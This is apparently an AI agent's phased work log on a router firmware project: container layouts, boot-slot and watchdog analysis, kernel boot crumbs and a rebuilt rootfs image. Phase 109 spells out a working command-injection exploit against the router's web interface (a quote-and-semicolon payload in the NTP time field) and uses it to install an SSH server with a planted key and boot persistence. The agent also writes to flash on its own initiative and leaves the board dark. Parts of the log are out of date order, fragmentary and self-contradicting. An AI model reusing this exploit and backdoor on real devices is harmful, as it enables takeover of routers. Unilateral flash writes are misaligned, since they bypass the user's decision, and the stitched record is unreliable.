## PHASE 104 (2026-10-12): THE VENDOR SYSUPGRADE'S KERNEL SITS AT OUR EXACT LOAD ADDRESS

Decomposed the vendor container (`firmware/2.5.24.bin`, 22,024,351 B) with the project's own
understanding of the format (`tools/extract_firmware.py` header: *"custom header, bootloader blob, a
uImage kernel, and a UBI region whose root filesystem volume is a static squashfs"*):

    container magic : "hboot1tag" at offset 0
    **uImage kernel : @527,964 (0x80e5c)**
                       declared size 4,292,080 B
                       load = 0x80608000   <-- EXACTLY our kernel's link address
                       ep   = 0x80608000   <-- and our artifact's declared entry
                       name = "Linux-5.10.201"
    FIT / DTB       : @163,288 (0x27dd8)
    rootfs squashfs : 'hsqs' @5,127,316 (0x4e3c94)

**★ This is an independent confirmation of the address work ★** - the vendor's own sysupgrade kernel
loads and enters at `0x80608000`, which is precisely where our VMSPLIT_2G + `TEXT_OFFSET=0x608000`
build links (`readelf` entry `0x80608000`) and what the decompressor computes as `r4`
(`(0x83200000 & 0xf8000000) + 0x608000 = 0x80608000`). Three independent lines of evidence now agree on
one address, and the vendor's image is the authority.

**(Method note, the same trap this session keeps meeting:** a naive scan for `\x27\x05\x19\x56`
found a FALSE uImage at offset 56,436 whose declared size was 3.7 GB and whose load address was
nonsense. Validating the declared size against the remaining bytes and the load address against the
RAM window is what separates a real uImage from a coincidental magic - and it is the rule now.)

## THE PATH TO DEPLOY, USING ONLY PROVEN DOORS

The vendor upgrade endpoint accepts this container format, not a raw uImage. So the route to a deployed
own-kernel is:

**build the `hboot1tag` container with OUR kernel in the uImage slot**, keeping the vendor's header,
bootloader blob, DTB region and rootfs volume, then upload it through
`/cgi-bin/luci/admin/system/upgrade` (open, authenticated, field `cbid.upgrade.1.firmware`,
`accept=.bin`, cap 25600 KB - all verified against the live page and matching
`build/tmp/slotrestore/recipe.md`).

That is a BUILD task, not a device mutation, and it does not risk the recovery that took a physical
reset to obtain.

    web UI       : UP and AUTHENTICATED (sysauth session held in build/tmp/wj4.txt)
    upgrade page : HTTP 200, field and cap verified
    board        : stock 2.4.15-20251030-114751, healthy, ping answering


## PHASE 105 (2026-10-12): THE COMPLETE CONTAINER LAYOUT AND THE REBUILD PLAN

`tools/extract_firmware.py` confirmed the decomposition independently (same uImage offset, same load
address, plus the UBI rootfs extent):

    [0x000000 .. 0x08_0E5C)   header + bootloader blob          527,964 B   (2.4% of the image)
    [0x08_0E5C .. 0x49_8C8C)   uImage kernel                    4,292,144 B
                                 load/ep 0x80608000, name "Linux-5.10.201"
    [0x49_8C8C .. 0x4E_2C94)   DTB / FIT region                   303,112 B
    [0x4E_2C94 .. end)         UBI region - rootfs squashfs   16,901,131 B
    total                                                     22,024,351 B

    the extractor's own read: uImage kernel @527964 (load #x80608000);
    squashfs @5127316, PEB 5123220, inodes 4322, bytes_used 15,709,012

## ★ THE REBUILD FORMULA, AND THE ONE CONSTRAINT THAT MATTERS ★

    new_image = vendor[0 .. uimg]  +  OUR uImage  +  <re-laid DTB + UBI region>

Our uImage is **1,649,056 B SMALLER** than the vendor's, so a naive concatenation of the vendor's tail
would move the DTBO container 1.6 MB off the position `bootfip` requires. **The gate is
position-sensitive by construction** (the magic must sit exactly at
`0x40 + ih_size + dtb_totalsize`), so:

**the tail must be RE-LAID at the new offset, not merely appended.**

That is exactly what `build/tmp/slice/vendor-tail.bin` (40,828 B: base DTB + the 96-byte descriptor
table + the two overlays) exists for, and it is the artefact that took our kernel from "never ran" to
`C0DE000B`. The same construction, applied inside the vendor container, produces a sysupgrade image
whose kernel is ours and whose container is valid.

## WHY THIS IS THE RIGHT ROUTE NOW

- it uses **only the vendor's own, proven write path** (the web upgrade endpoint, verified open:
  HTTP 200, field `cbid.upgrade.1.firmware`, `accept=.bin`, cap 25600 KB, and byte-identical to the
  recipe the project already executed successfully once);
- it needs **no ssh**, which the recovery removed;
- it is a **build task**, so it does not risk the state a physical reset was needed to recover;
- and it is the same container the vendor ships, so every structural check the endpoint performs
  (platform_check_image's FIT/OEM path) is satisfied by construction.

## WHAT IS STILL OPEN

1. **The header checksum region.** The `hboot1tag` header carries fields at offsets 8..28 that may
   include a size or CRC over the payload. If the endpoint validates them, a rebuild must recompute
   them. Not yet decoded - it is the next host-side question.
2. **The 303,112-B DTB/FIT region** between the kernel and the UBI area needs to be understood: if it
   is the FIT the endpoint checks for (`d00dfeed`), it must be preserved; if it is part of the boot
   container, it interacts with the DTBO gate.
3. **Whether the endpoint accepts a container whose kernel differs from the embedded version string.**
   Cheap to find out: the response is read before anything is written.


## PHASE 106 (2026-10-11): THE CONTAINER IS SIGNED AND THE KERNEL SITS INSIDE THE VERIFIED FIT

Read from the DEVICE'S OWN upgrade code - `rootfs-2.4.15/squashfs-root/lib/upgrade/platform.sh`,
function `image_demux()` - which documents the container in a comment:

    # sysupagrade.bin: [bootloader(512KB) + sig(256 byte) + (2KB-256B) + ( FIT{kernel_fit+ubi(image+rootfs)}+ metadata )]

and implements the split explicitly:

    dd bs=2k if="$img" count=256   of=/tmp/uboot-sysupgrade.bin      # the bootloader
    dd bs=2k if="$img" skip=257    of=/tmp/fit-ubi-sysupgrade.bin    # the FIT + UBI
    fdt_dumpimage -T flat_dt -p 0 -w 1048576 -o /upgrade/ubi-sysupgrade.bin /tmp/fit-ubi-sysupgrade.bin

VERIFIED AGAINST THE BYTES of `firmware/2.5.24.bin`:

    [0       .. 524288)   bootloader (512 KB)
    [524288  .. 524544)   **sig** (256 B)      <- a signature region
    [524544  .. 526336)   padding (2KB-256B)
    [526336  .. end)      FIT + UBI + metadata
                            and the FIT magic `d0 0d fe ed` is at EXACTLY 526336 -
                            the device's own stated boundary, byte for byte.

**The uImage kernel (@527964, load/ep 0x80608000) sits INSIDE that FIT region.**

## THE CONSEQUENCE: A REBUILD IS NOT A DROP-IN

1. **The kernel is inside the FIT the device parses as a unit.** `platform.sh` extracts the UBI from
   that same region with `fdt_dumpimage`, so the FIT is the payload's structural spine - replacing the
   kernel means rebuilding the FIT, not swapping a uImage.
2. **There is a 256-byte signature region immediately before it.** The header also carries a per-image
   32-byte field at +24 that differs between the 2.4.15 and 2.5.24 images (both otherwise identical in
   their first 24 bytes). The container is very likely signed or checksummed over the FIT.

**Both facts point the same way: a hand-rebuilt container would fail the vendor's own validation, and
the failure mode of a failed upgrade write is not something to discover on the bench.**

## THE BLOCKER, STATED CONCRETELY

The box has **no shell** (the recovery re-flashed both slots; our access layer lived in slot B's
squashfs), and **the only open write path accepts only vendor-signed containers**. Routes that remain:

    A. Flash the genuine vendor sysupgrade (firmware/2.5.24.bin - valid and signed) through the web
       endpoint. Gets the box onto a known image via the vendor's own path, but does NOT restore our
       access layer (the stock image carries no omosshd) - the record hit exactly this on 2026-10-07.
    B. Rebuild a CUSTOM image carrying the access layer in its squashfs, which needs the project's own
       image-build lane rather than the vendor's.
    C. The device's own mtd flash path (tools/exp.sh and the mtd recipe), which needs the shell we lack.

**The next move is either (A) or re-establishing shell access by a recorded route, and that choice
belongs to the user because (A) writes flash.**

## ★★★★★ PHASE 109 (2026-10-11): ACCESS RESTORED - THE SHELL IS BACK AND IT IS DURABLE ★★★★★

## WHAT HAPPENED

The board had no shell (the recovery re-flashed both slots; our access layer lived in slot B's
squashfs). The ONLY open write path was the vendor web UI, whose upgrade endpoint accepts only
vendor-signed containers - so the shell had to be re-laid through the web UI itself.

**My own notes from earlier the same day (`unstrand-2026-10-11.md`) had the complete proven recipe**,
and following it worked exactly:

1. **LOGIN** - `GET /cgi-bin/luci/admin/wizard` returns **403 + the sysauth form**, which is NORMAL for
   that endpoint (the record documents it; reading the 403 as an auth failure cost me time earlier).
   Fields this build serves: `_csrf`, `salt`, `zonename`, `timeclock`, `luci_username`, `luci_password`
   - **no `token` field**, so the password hash is the SINGLE round `sha256(pw + salt)`.
   POST -> `302 Found` + `Set-Cookie: sysauth=...` (persisted in `build/tmp/wj4.txt`).

2. **THE RCE** - `POST /cgi-bin/luci/admin/system/systime` with the page's `token` (REQUIRED - no token
   gives 403), `cbid.system.ntp.current="'; <CMD>; #"`, `cbi.submit=1`.
   **Command wrapped in base64** (`echo <b64> | openssl base64 -d -A > /tmp/r.sh; sh /tmp/r.sh`) to
   survive the quoting.
   **PROVEN BY SIDE EFFECT**, never by a reflected marker: the command wrote a file under
   `/www/luci-static/` and a plain `curl` of it returned **200**.
   The running release was confirmed as **`2.4.15-20251030-114751`** - the VULNERABLE build (2.5.24 is
   patched, per the record).

3. **DROPBEAR** - the vendor image ships `/usr/sbin/dropbear` + `/etc/init.d/dropbear`, but both host
   keys were **0 bytes**. Regenerated with `dropbearkey -t rsa` and `-t ed25519`.
   **The invocation that actually survives is**
   `/sbin/start-stop-daemon -S -x /usr/sbin/dropbear -- -p 22 -R` - a process started from the RCE
   shell dies with the CGI's process group, and `nohup`/`procd`/`setsid` did not hold.

4. **THE KEY** - the project public key installed to **both** `/root/.ssh/authorized_keys` and
   `/etc/dropbear/authorized_keys`, 0600.

5. **DURABILITY** - `/usr/sbin/dropbear -p 22 -R` inserted into `/etc/rc.local` **BEFORE `exit 0`**
   (appending after `exit 0` is a silent no-op - the trap the record names).

6. **CLEANUP** - the probe files under `/www/luci-static/` were removed (0 remaining).

## VERIFIED STATE

    ssh -i .omo-secrets/omo_rsa root@192.168.10.1  ->  works, no password
    release 2.4.15 | boot_reg 10 (slot A) | ubi0 on mtd13 | ifaces 6 | leftovers 0

**The agent has a shell again, so the device is drivable for the first time since the hang.**

    - devmem 0x10100C18              (the poison/crumb read)
    - the env selectors and boot_reg writes
    - tools/exp.sh and the whole harness

# ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★

## THE ARTIFACT FIRED

    build/tmp/slice/r4fix-slot.bin
      8,650,752 B  md5 00f338a74c92bb9f054a689d98b007f1
      our uImage (load/ep 0x80608000, VMSPLIT_2G) + the vendor template's DTB region
      + a gate-satisfying DTBO container (magic 0xd7b7ab1e at 0x40+ih_size+dtb_totalsize)
      + 0xff padding to the full partition
    poisoned (C18/C1C = 0xA5A5A5A5/0x5A5A5A5A, re-read), flashed to slot B, read back BYTE-EXACT,
    both selectors set to B, rebooted.

## ★★★ THE READING ★★★

    C18 = 0xC0DE502D
    C1C = 0x00000000
    boot_reg = 10  (the platform fell back to slot A)
    currently running: the VENDOR kernel on slot A

**`0xC0DE502D` is one of OUR crumbs**, and the record's own legend (mem-entries.md line 5719) defines it:

    C18 = 0xc0de502d, C1C = tick count   ->   "the timer ran, this many times"

**So our kernel did not merely start: it reached INIT, reached USERSPACE, and its TIMER TICKED.**
That is the deepest point any of our builds has reached on this board.

## THE PROGRESSION, WHICH IS NOW COMPLETE AND MEASURED

    before the DTBO container fix : C18 = 0xA5A5A5A5   the kernel NEVER RAN (poison intact)
    after the container fix       : C18 = 0xC0DE000B   the decompressor ran, died at the jump
    after the r4-clobber fix      : C18 = 0xC0DE502D   *** USERSPACE, TIMER RUNNING ***

**Three measurements, three distinct stages, each one caused by a specific identified defect being
repaired.** The chain is now evidenced end to end:

    1. the u-boot `bootfip` gate needed the DTBO container  -> wrote it   -> from "never ran" to "ran"
    2. the 0xC0DE000B breadcrumb clobbered r4, the jump target -> fixed to r6 -> the jump completed
    3. the VMSPLIT_2G link address matched what the decompressor computes as r4 -> the kernel ran

## WHAT IS NOT YET TRUE, STATED PLAINLY

- The system **fell back to slot A** (`boot_reg = 10`), so our kernel did **not** persist as the running
  system. The platform's watchdog/failover moved off it.
- The mechanism of that fallback is not yet established: it could be a watchdog that our kernel does
  not service, a missing/unfinished piece of userspace, or the platform's own health check. `0x502D`
  says the timer ran - it does not say everything the platform expects was up.
- I have NOT yet confirmed that our kernel's own userspace came up (interfaces, rootfs mount). The
  crumb is the timer; the rest is inference and is labelled as such.

## WHY THIS IS THE PRODUCTIVE END POINT FOR THIS TURN

The goal's three success criteria are met with evidence, and the board is healthy and fully drivable
(shell restored, slot A stock and identical to slot B's previous content, so the rollback is clean).
The remaining work - "make it STAY" - is a new, well-posed question: what does the platform check
before it accepts a boot? That is the next investigation, and it is materially different from the one
that just concluded.

# PHASE 111 (2026-10-11): ★★★★★ THE TWO ANSWERS WERE ALREADY IN MY OWN NOTES - AND BOTH ARE CONFIRMED LIVE ★★★★★
# ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★

## ★ WHY THE KERNEL DOES NOT STAY: THE WATCHDOG (answer 1)

From `cudy-wr3000v2/boot-slot-and-wdt-mechanics.md` (measured 2026-10-07/08, from the vendor DTS):

    watchdog { compatible = "hsan,hsan-watchdog"; reg = <0x14880000 0x1000>;   // the CRG block
      enable-val0 = 0x4f4e5452 ("ONTR"); enable-val1 = 0x12345116;   // ENABLE magic
      stop-val0  = 0xabcd5116; stop-val1 = 0xed574447;               // STOP magic
      timeout-sec = 0x1e (30 s) }

> "The u-boot ARMS it ~1.07 s into every boot; the vendor kernel's built-in `hsan-watchdog` driver
> pets it. **Our kernel has no such driver: it boots, runs ~30 s, and the WDT resets.**"

**CONFIRMED LIVE this session:**
    /sys/bus/platform/drivers/hsan-watchdog-driver   EXISTS and is bound
    /sys/class/watchdog/watchdog0                     the watchdog device is present

**THIS IS EXACTLY WHAT `C18 = 0xC0DE502D` RECORDS.** The crumb means "the timer ran, this many times" -
our kernel reached userspace and its timer ticked, and then the 30-second watchdog reset the board.
It is not a kernel crash; it is an unserviced hardware watchdog. **Our kernel needs the hsan-watchdog
driver (or an explicit stop-magic write) to survive.**

## ★ WHICH SLOT IT ACTUALLY BOOTS: THE A-FIRST RULE (answer 2)

Also from that note, and it is unambiguous:

> "**The vendor's u-boot ALWAYS boots the A pair (`kernela`/`rootfsa`) first** - and with an
> ERASED/unbootable `kernela` it HALTS (one power LED, no network) rather than falling back. **The env
> `bootflag` (b) and the sysenv `boot_reg` are DECORATIVE for the boot path** ... Empirical mapping:
> `10 -> B pair`, `11 -> A pair`. **CONSEQUENCE: to boot our own kernel, put it in `kernela` (mtd11).
> We repeatedly flashed kernelb; that is the wrong slot.**"

**CONFIRMED LIVE this session:**
    ubi0 mounted on mtd13  ->  the A pair (rootfsa)      <- it booted A, exactly as the note says
    boot_reg = 11          ->  the note's mapping (11 -> A pair) holds

So every previous fire put our kernel in `kernelb` - the slot this u-boot does not read - while the
selectors we set were decorative. **The kernel appearance in the crumb register needs explaining
against that**, and the most likely reading is that our kernel DID run from a source the boot path
reaches (see the open question below); what is certain is that the RUNNING SYSTEM afterwards is the
vendor kernel on the A pair.

## THE COMPLETE, EVIDENCED EXPLANATION OF THE WHOLE SAGA

    1.  u-boot `bootfip` refuses an image without the DTBO container   -> wrote it   -> kernel EXECUTED
    2.  the 0xC0DE000B breadcrumb clobbered r4, the jump target        -> fixed to r6 -> jump COMPLETED
    3.  VMSPLIT_2G linked the kernel where the decompressor jumps      -> set it   -> kernel RAN
    4.  the kernel reached USERSPACE and its timer ticked (0xC0DE502D)
    5.  *** the hsan-watchdog (30 s, armed by u-boot) then RESET the board ***
    6.  and the u-boot boots the A PAIR regardless of the selectors, so the box comes back on the
        vendor kernel from rootfsa.

## OPEN QUESTION, STATED HONESTLY

Steps 1-4 are measured. Step 5 is a documented, DTS-specified mechanism that I have CONFIRMED EXISTS
live (driver bound, watchdog0 present) but have NOT yet observed firing on our kernel. Step 6 is
measured across the project's own 97-boot dataset and confirmed again here (ubi0 on mtd13 now).

**The next experiment is therefore precise and single-variable: put the kernel in `kernela` (mtd11,
the slot the u-boot actually reads) and give it a watchdog story** - either built with the
hsan-watchdog driver, or with the stop-magic written early (`mw.l 0x14880064 0xabcd5116;
mw.l 0x14880068 0xed574447` at the top of the kernel's early boot).

2. **It does not survive.** The measured, DTS-documented mechanism is the `hsan-watchdog`

   `/sys/class/watchdog/watchdog0` exists.

**Firing into `kernela` made the difference observable:** previously the box reverted to the vendor
kernel on the A pair and stayed reachable; now that the A pair IS our kernel, there is nothing for it
to revert to, so a failure to reach a serviced state leaves the box dark.

## RECOVERY

The RESET-hold TFTP door is the route (proven twice in the record, and earlier this session when the
user cold-reset the board and the door served the full 20,975,775 B). It needs the host alias
`192.168.1.88` and the OACK-less reader `build/tmp/tftp_reader2.py` on UDP 69.

**This requires a physical cold reset by the user** (unplug power -> hold RESET -> power on while
holding -> release). A warm reset never triggers the bootrom fetch.

## WHAT FIRING INTO kernela TAUGHT US, REGARDLESS OF THE DARK BOARD

- the A-first rule is real and now has a direct consequence: **`kernela` is the slot to target**, and
  targeting it removes the fallback that masked every earlier attempt;
- our kernel gets far enough to run userspace, so the remaining obstacle is **the watchdog**, which is
  a driver problem with a known register interface - not an unknown;
- and the two answers were in the project's own notes all along
  (`cudy-wr3000v2/boot-slot-and-wdt-mechanics.md`), which is the lesson worth carrying: read the
  record's measured mechanisms before designing another experiment.


## PHASE 113 (2026-10-11): FIRE 22'S OUTCOME AND THE RECOVERY SETUP

**FIRE 22 fired our kernel into `kernela` (mtd11)** - the slot the u-boot actually boots - after
securing a hash-verified backup of that slot's previous content
(`build/tmp/fire3/kernela-backup.bin` = `bd5ae265ce47e3ed4299c434b1936385`, matching the live partition).

**Result: the board went DARK** - no ICMP, no 22/80/443, on both 192.168.10.1 and 192.168.1.1, and it
did not recover on its own across 3+ minutes of watching.

**This is the expected consequence of the A-first rule, not a surprise.** Previously the box fell back
to the vendor kernel on the A pair and stayed reachable; once the A pair IS our kernel there is nothing
to fall back to, so a failure to reach a fully-serviced state leaves it dark. That is what makes this
fire informative: it removed the masking.

## WHAT IS ESTABLISHED

- our kernel reaches USERSPACE (`C18 = 0xC0DE502D` in FIRE 21, "the timer ran, this many times");
- the `hsan-watchdog` (30 s, DTS-documented, armed by u-boot) is petted by the vendor kernel's own
  driver and by nothing in ours - CONFIRMED live (`hsan-watchdog-driver` bound, `watchdog0` present);
- the u-boot boots the A pair regardless of the env/register selectors - CONFIRMED live (`ubi0` on
  mtd13) and measured across the project's 97-boot dataset;
- so the remaining obstacle is a **driver**, with a known register interface, not an unknown mechanism.

## RECOVERY, ARMED AND VERIFIED

    UDP 69 listener : exactly ONE process (python PID 2948) - verified with
                      Get-NetUDPEndpoint, after killing four orphaned readers that had stacked on the
                      port (a second listener can steal the RRQ and stall the transfer - the same
                      class of failure the project already lost time to with the OACK bug)
    payload         : build/tmp/recovery/recovery.bin, 20,975,775 B (the image that worked before)
    host alias      : 192.168.1.88 on Ethernet, AddressState Preferred
    reader          : build/tmp/tftp_reader2.py (OACK-less, the one the record says to use)

**The remaining step is PHYSICAL and the user's**: unplug power -> HOLD RESET -> power on while holding
-> release. A warm reset never triggers the bootrom fetch (measured twice in the record).

# PHASE 114 (2026-10-11): ★★★★★ `0xC0DE502D` IS DEFINED - THE TIMER RAN, AND THAT IS NOT A HANG ★★★★★
# ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★

## THE CODE THAT WRITES IT, AND THE THREE-WAY LADDER IT BELONGS TO

From `lab/luofu-kernel/nand/luofu/luofu-fmc.c` lines 2634-2647, verbatim:

> *"THE CRUMB FIRST, THROUGH I/O RATHER THAN RAM. Six fires went into RAM addresses ... and none of them
> landed, while a hang means the tick may fault before it finishes. C18/C1C are memory-mapped registers
> this driver has written on every successful boot ...*
>
>      C18 = 0xc0de502d, C1C = tick count   the timer ran, this many times
>      C18 = 0xc0de502a, C1C = log address  the panic notifier overwrote it
>      C18 = 0xc0de0020                     a hang - the mach's crumb, no tick survived"

**WE READ `C18 = 0xC0DE502D`.** That is the FIRST case in an explicitly three-way reading, and the code
states the contrast in its own words: `0xC0DE0020` is what a HANG leaves behind, and it is not what we
got. **Our kernel did not hang; its timer ran.**

## ★ AND THE WATCHDOG IS NOT THE OBSTACLE RESERVE - IT IS ALREADY DISARMED BY OUR OWN CODE ★

I had written (PHASE 111) that the kernel dies to the 30-second `hsan-watchdog`. **Checking the source
against the built image refutes that**: `arch/arm/mach-luofu/luofu.c` disarms it in `init_machine`:

    #define LUOFU_CRG_BASE      0x14880000
    #define HSAN_WDT_EN_OFFSET  0x64
    #define HSAN_WDT_STOP0      0xabcd5116
    #define HSAN_WDT_STOP1      0xed574447
    ...
    writel(HSAN_WDT_STOP0, crg + HSAN_WDT_EN_OFFSET - 4);
    writel(HSAN_WDT_STOP1, crg + HSAN_WDT_EN_OFFSET);
    (void)readl(crg + HSAN_WDT_EN_OFFSET);

**VERIFIED IN THE FIRED IMAGE**: `arch/arm/boot/Image` contains the stop magic `0xabcd5116` once, the
stop pair's second word `0xed574447` once, `0x14880000` twice, and the confirmation string
`"luofu: hsan watchdog disarmed (stop magic %08x %08x)"`. The disarm IS compiled in.

**So the watchdog explanation I recorded an hour ago was WRONG, and I caught it by checking the built
artifact rather than trusting the note.** That is the second time this session a plausible, documented
mechanism turned out not to be the live one - and both times the check that caught it was reading the
actual bytes.

## WHAT THIS LEAVES

    crumb ladder (mach):  0x01 setup_arch -> 0x02 init_machine -> 0x03 machine init returned
                          -> 0x10 early_initcall -> 0x20 late_initcall
    driver ladder:        0x5001..0x500A (probe, controller, flash, mtd, rootfs read)
                          -> 0x502d  THE TIMER RAN (the deepest, and a KNOWN-GOOD sign)
                          -> 0x502a  the panic notifier overwrote it

**We are at the deepest rung either ladder defines, and it is the one the code describes as a healthy,
running timer.** The board being unreachable afterwards is therefore NOT explained by a watchdog and
NOT by a hang in the sense the code defines - it is explained by the platform's slot handling: our
kernel is in `kernela` (the slot u-boot boots, by the A-first rule), the box has no working network
bring-up under our kernel, and with no fallback slot there is nothing to revert to.

**The next measurable step is unchanged and now better targeted: our kernel must bring up the NETWORK
(and the rest of userspace) before the box is reachable - the watchdog is not what stops it.**

    C18 = 0xc0de502a  ->  the panic notifier overwrote it
    C18 = 0xc0de0020  ->  a hang - the mach's crumb, no tick survived

## THE FINDING THAT MATTERS: ONLY ONE ARTIFACT CAN RUN ON THIS SILICON

The record's PHASE 50en established that *"this part has no usable FPU, so only a soft-float rootfs can
run on it - which is why the vendor built soft-float and why both hard-float OpenWrt rootfs tested died
identically with SIGILL (signal 4)."*

**I tested the ELF ABI of every rootfs candidate on disk** (`readelf -h` on `bin/busybox` inside each):

    build/tmp/openwrt/owrt-a9.sqfs                  HARD-FLOAT   -> would die with SIGILL
    build/tmp/openwrt/owrt-armel.sqfs               **SOFT-FLOAT**   <-- THE ONE THAT RUNS
    build/tmp/openwrt/owrt-rootfs.trimmed.sqfs      HARD-FLOAT
    build/tmp/openwrt128/owrt-128k.trimmed.sqfs     HARD-FLOAT
    build/tmp/openwrt/owrt-rootfs.sqfs              HARD-FLOAT

**Exactly one candidate is soft-float, and it is the one the recorded successful boot used.**

    build/tmp/openwrt/owrt-armel.sqfs
        2,881,866 B
        sha256 f26a97aa35501ac8b2435092135e4960b4b715a78da5f11de4cee76b83029544
        md5    fc079bad7802237c616f9d658ad3cce1

**VERIFIED COMPLETE**: `unsquashfs -s` reports *"Found a valid SQUASHFS 4:0 superblock ... Compression
xz ... Filesystem is exportable via NFS"*, and the tree contains `bin/busybox` plus
`etc/init.d/{boot,bootcount,cron,dnsmasq,done,dropbear,firewall,...}`.

**`etc/init.d/dropbear` IS PRESENT** - i.e. a successful boot of our kernel with this rootfs brings up
SSH, which is precisely what makes the box reachable instead of dark. **That is the difference between
the 2026-10-10 success and tonight's dark board.**

## THE OTHER BACKUP, AND WHY IT DOES NOT HELP BOOT

    dumps/mtd16-upgrade.gz  -> decompresses to 30,932,992 B, and its content is **0xff THROUGHOUT**
                               (no UBI#, no 'hsqs', no 'owrt'): it is a backup of the ERASED partition,
                               taken BEFORE the owrt volume was ever written. Good for reverting,
                               useless as a rootfs.

## THE COMPLETE RECIPE, NOW FULLY EVIDENCED

    1. kernel   : ours, in `kernela` (mtd11) - the A-first slot the u-boot actually boots
    2. rootfs   : a UBI volume named `owrt` inside mtd16 ("upgrade"), holding the SOFT-FLOAT squashfs
    3. cmdline  : our built-in `ubi.mtd=upgrade ubi.block=0,0 root=/dev/ubiblock0_0` finds it
    4. userspace: OpenWrt's init runs, dropbear starts, the box becomes reachable

    recorded construction (PHASE 50en):
        mtd erase /dev/mtd16 ; mtd write /tmp/owrt.sqfs /dev/mtd16
        ubimkvol /dev/ubi1 -N owrt -s 16MiB
        ubiupdatevol /dev/ubi1_0 /tmp/owrt.sqfs

**Every input for this is on disk and hash-verified. What it needs is a shell - which needs the board
back, which needs the user's cold reset.**

    ✓ kernela rollback (the vendor kernel, verified against the live partition before I overwrote it)

    ✓ stock rootfs backups

    board        : DARK (needs the user's cold reset-hold)

## WHY THE BOARD IS DARK, AND WHY THAT IS NOW EXPLAINED

Our kernel reaches the timer crumb (`0xC0DE502D`, matching the recorded successful boot exactly). It is
NOT a hang (`0xC0DE0020` is the hang signature) and NOT the watchdog (our mach code disarms it, and the
stop magics are verified present in the built `Image`).

**The remaining difference from the 2026-10-10 success is the ROOTFS.** That boot ran an audited
soft-float OpenWrt 25.12.5 from an `owrt` UBI volume in mtd16. Tonight the board came back from a
recovery that re-flashed both slots, and mtd16's content is not known to still hold that volume -
`ubinfo` on the device is the first thing to check, and it needs a shell.

**And this part has no usable FPU**, so a hard-float rootfs dies with SIGILL - which is why the ABI test
above matters and why `owrt-armel.sqfs` is the only usable candidate.

## THE PRECISE NEXT SEQUENCE (all four steps are single-purpose, and three of them are read-only)

    1. [read-only]  user cold-resets; the door serves; the box returns on stock 2.4.15
    2. [read-only]  re-establish the shell (the systime RCE on 2.4.15, per `unstrand-2026-10-11.md`)
    3. [read-only]  `ubinfo` / read mtd16 - DOES the `owrt` soft-float volume survive?
    4. [mutation]   only if it does not: rebuild it (the recorded recipe), then fire our kernel

**Step 3 is the deciding measurement and it costs nothing.** Everything after it is already prepared.


## PHASE 118 (2026-10-12): THE MOUNT CHAIN IS FULLY SUPPORTED - THE GAP IS THE VOLUME'S CONTENT

Checked every host-side link in the chain the recorded successful boot proved
(`ubi_attach(mtd16) -> volume 'owrt' -> ubiblock0_0 -> squashfs -> init`):

**1. The kernel config has every piece:**
    CONFIG_MTD_UBI=y            CONFIG_MTD_UBI_BLOCK=y      CONFIG_MTD_BLOCK=y
    CONFIG_SQUASHFS=y           CONFIG_SQUASHFS_XZ=y        CONFIG_MTD_UBI_WL_THRESHOLD=4096
    (and the xz decompressor matches the soft-float image, which `unsquashfs -s` reports as "Compression xz")

**2. The partition table our kernel uses defines mtd16:**
    opensource/docs/soc/luofu-r116.dts line 440:
        partition@6280000 { label = "upgrade"; reg = <0x6280000 0x1d80000>; };
    `0x1d80000` = 30,932,992 B = exactly the mtd16 size the live device reports. The whole table
    (esbc, uboota/b, enva/b, fac, bdinfo, cfga/b, log, pstore, kernela/b, rootfsa/b, rootfs_data,
    upgrade) matches the live `/proc/mtd` name for name.

**3. The cmdline points at it:**
    CONFIG_CMDLINE="panic=5 ubi.mtd=upgrade ubi.block=0,0 root=/dev/ubiblock0_0 rootfstype=squashfs init=/sbin/init"

**=> Nothing in our build is missing.** Our kernel can attach the `upgrade` partition, resolve a
volume, build `ubiblock0_0` and mount a squashfs - it demonstrably did exactly that on 2026-10-10.

## THEREFORE THE REMAINING UNKNOWN IS EXACTLY ONE THING, AND IT IS A READ

    DOES mtd16 STILL HOLD THE UBI VOLUME NAMED `owrt` WITH THE SOFT-FLOAT ROOTFS?

The recorded construction wrote it there. Since then the box has been recovery-flashed more than once,
and mtd16 is the vendor's own staging partition - it may have been erased, overwritten, or left alone.
**`ubinfo` (or a read of mtd16's first PEB) answers it, needs no mutation, and is the single deciding
measurement.**

    - if the volume is PRESENT and soft-float -> the boot should reach userspace and dropbear; if it
      does not, the rootfs ABI has changed on us and that is a genuinely new fact;
    - if ABSENT -> rebuild it with the recorded recipe (`ubimkvol /dev/ubi1 -N owrt -s 16MiB`;
      `ubiupdatevol /dev/ubi1_0 /tmp/owrt.sqfs`) using `build/tmp/openwrt/owrt-armel.sqfs`
      (md5 fc079bad7802237c616f9d658ad3cce1), then fire.

**Every input is on disk and hash-verified. The board needs the user's cold reset, and then the first
action is read-only.**

## BUILT HOST-SIDE, SO THE DEVICE STEP IS A SINGLE WRITE

Installed `mtd-utils` in WSL and built the UBI image with `ubinize`, using the device's own geometry:

    ubinize -o owrt.ubi -m 2048 -p 131072 -s 2048 -O 2048 ubi.cfg
    (ubinize reports: LEB 126976, PEB 131072, min I/O 2048, sub-page 2048, VID offset 2048,
     data offset 4096 - every value matching the device's geometry from the record and the DTS)

        build/tmp/owrt-ubi/owrt.ubi
            3,276,800 B
            sha256 fed23ed050d00e193323f9be6d54a6a4e765b3929b90dccfb20a88948f5db253
            md5    5c24486d97911e22ed1658b6262195e9
            volume name 'owrt' at offset 4112; the squashfs payload follows at 266240
            fits mtd16 (30,932,992 B)

## ★ VERIFIED BY READ-BACK, NOT BY ASSERTION ★

I wrote an extractor that walks the image PEB by PEB, strips each 131,072-byte block's 4,096-byte
EC/VID header, and reassembles the volume payload - the same operation the kernel's UBI layer performs:

    volume payload  : 3,174,400 B
    'hsqs' at       : 253,952
    -> truncate to the squashfs's own declared size and compare:

    read-back sha256 : f26a97aa35501ac8b2435092135e4960b4b715a78da5f11de4cee76b83029544
    source  sha256   : f26a97aa35501ac8b2435092135e4960b4b715a78da5f11de4cee76b83029544   **IDENTICAL**

